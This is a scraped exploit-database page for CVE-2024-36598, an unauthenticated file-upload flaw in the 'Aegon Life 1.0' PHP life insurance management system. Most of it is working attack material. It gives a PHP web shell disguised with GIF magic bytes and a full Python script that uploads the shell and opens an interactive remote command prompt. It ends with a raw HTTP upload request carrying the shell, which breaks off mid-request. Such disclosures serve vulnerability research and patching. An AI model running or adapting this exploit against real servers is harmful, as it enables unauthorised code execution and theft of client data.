---
title: AEGON LIFE 1.0 Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2024060032
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-06-16
fetch_date: 2025-10-06T16:54:30.141856
---

# AEGON LIFE 1.0 Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **AEGON LIFE 1.0 Remote Code Execution** **2024.06.15**  Credit:  **[Aslam Anwar Mahimkar](https://cxsecurity.com/author/Aslam%2BAnwar%2BMahimkar/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2024-36598](https://cxsecurity.com/cveshow/CVE-2024-36598/ "Click to see CVE-2024-36598")**  CWE: **N/A** | |

# Exploit Title: Life Insurance Management System- Unauthenticated Remote Code Execution (RCE)
# Exploit Author: Aslam Anwar Mahimkar
# Date: 18-05-2024
# Category: Web application
# Vendor Homepage: https://projectworlds.in/
# Software Link: https://projectworlds.in/life-insurance-management-system-in-php/
# Version: AEGON LIFE v1.0
# Tested on: Linux
# CVE: CVE-2024-36598
# Description:
----------------
-An arbitrary file upload vulnerability in Aegon Life v1.0 allows attackers to execute arbitrary code via uploading a crafted PHP file by adding image/gif magic bytes in payload.
-In insertClient.php fileToUpload is only checking for image file but not checking for extensions, also header.php is not properly handling the redirection hence allowing Unauthenticated redirect.
# Payload:
------------------
payload = "GIF89a;'<?php echo shell\_exec($\_GET[\'cmd\']); ?>'"
# RCE via executing exploit:
---------------------------------------
# Step : run the exploit in python with this command: python3 shell.py http://localhost/lims/
# will lead to RCE shell.
POC
-------------------
import argparse
import random
import requests
import string
import sys
parser = argparse.ArgumentParser()
parser.add\_argument('url', action='store', help='The URL of the target.')
args = parser.parse\_args()
url = args.url.rstrip('/')
random\_file = ''.join(random.choice(string.ascii\_letters + string.digits) for i in range(10))
payload = "GIF89a;'<?php echo shell\_exec($\_GET[\'cmd\']); ?>'"
file = {'fileToUpload': (random\_file + '.php', payload, 'text/php')}
print('> Attempting to upload PHP web shell...')
r = requests.post(url + '/insertClient.php', files=file, data={'agent\_id':''}, verify=False)
print('> Verifying shell upload...')
r = requests.get(url + '/uploads/' + random\_file + '.php', params={'cmd':'echo ' + random\_file}, verify=False)
if random\_file in r.text:
print('> Web shell uploaded to ' + url + '/uploads/' + random\_file + '.php')
print('> Example command usage: ' + url + '/uploads/' + random\_file + '.php?cmd=whoami')
launch\_shell = str(input('> Do you wish to launch a shell here? (y/n): '))
if launch\_shell.lower() == 'y':
while True:
cmd = str(input('RCE $ '))
if cmd == 'exit':
sys.exit(0)
r = requests.get(url + '/uploads/' + random\_file + '.php', params={'cmd':cmd}, verify=False)
print(r.text)
else:
if r.status\_code == 200:
print('> Web shell uploaded to ' + url + '/uploads/' + random\_file + '.php, however a simple command check failed to execute. Perhaps shell\_exec is disabled? Try changing the payload.')
else:
print('> Web shell failed to upload! The web server may not have write permissions.')
---------------------------------------------------------------------------------------------------------------------------
### Can also performed manually.
Payload:
--------------
GIF89a;
<?php
echo"<pre>";
passthru($\_GET['cmd']);
echo"<pre>";
?>
# Attack Vectors:
-------------------------
After uploading malicious image can access it to get the shell
http://localhost/lims/uploads/shell2.gif.php?cmd=id
Burp Suit Request
-----------------------------
POST /lims/insertClient.php HTTP/1.1
Host: localhost
Content-Length: 2197
Cache-Control: max-age=0
sec-ch-ua:
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5plGALZGPOOdBlF0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/lims/addClient.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
------WebKitFormBoundary5plGALZGPOOdBlF0
Content-Disposition: form-data; name="client\_id"
1716015032
------WebKitFormBoundary5plGALZGPOOdBlF0
Content-Disposition: form-data; name="client\_password"
Password
------WebKitFormBoundary5plGALZGPOOdBlF0
Content-Disposition: form-data; name="name"
Test
------WebKitFormBoundary5plGALZGPOOdBlF0
Content-Disposition: form-data; name="fileToUpload"; filename="shell2.gif.php"
Content-Type: application/x-php
GIF89a;
<?php
echo"<pre>";
passthru($\_GET['cmd']);
echo"<pre>";
?>
------WebKitFormBoundary5plGALZGPOOdBlF0
Content-Disposition: form-data; name="sex"
Male
------WebKitFormBoundary5plGALZGPOOdBlF0
Content-Disposition: form-data; name="birth\_date"
1/1/1988
------WebKitFormBoundary5plGALZGPOOdBlF0
Content-Disposition: form-data; name="maritial\_status"
M
------WebKitFormBoundary5plGALZGPOOdBlF0
Content-Disposition: form-data; name="nid"
1
------WebKitFormBoundary5plGALZGPOOdBlF0
Content-Disposition: form-data; name="phone"
1
------WebKitFormBoundary5plGALZGPOOdBlF0
Content-Disposition: form-data; name="address"
1
------WebKitFormBoundary5plGALZGPOOdBlF0
Content-Disposition: form-data; name="policy\_id"
1
------WebKitFormBoundary5plGALZGPOOdBlF0
Content-Disposition: form-data; name="agent\_id"
Agent007
------WebKitFormBoundary5plGALZGPOOdBlF0
Content-Disposition: form-data; name="nominee\_id"
1716015032-275794639
------WebKitFormBoundary5plGALZGPOOdBlF0
Content-Disposition: form-data; name="nominee\_name"
Test1
------WebKitFormBoundary5plGALZGPOOdBlF0
Content-Disposition: form-data; name="nominee\_sex"
1
------WebKitFormBoundary5plGALZGPOOdBlF0
Content-Disposition: form-data; name="nominee\_birth\_date"
1
------WebKitFormBoundary5plGALZGPOOdBlF0
Content-Disposition: form-data; name="nominee\_nid"
1
------WebKitFormBoundary5plGALZGPOOdBlF0
Content-Disposition: form-data; name="nominee\_relationship"
1
-----...